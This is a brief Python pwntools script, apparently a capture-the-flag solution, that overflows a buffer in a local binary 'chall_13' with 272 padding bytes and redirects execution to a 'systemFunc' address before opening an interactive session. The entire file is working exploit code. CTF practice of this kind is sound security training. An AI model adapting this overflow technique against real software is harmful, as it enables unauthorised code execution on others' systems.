# coding: utf-8
from pwn import *
elf=ELF("./chall_13")
sys = elf.sym.systemFunc
payload = b"A"*272 + p32(sys)
p=process("./chall_13")
p.recv()
p.sendline(payload)
p.interactive()
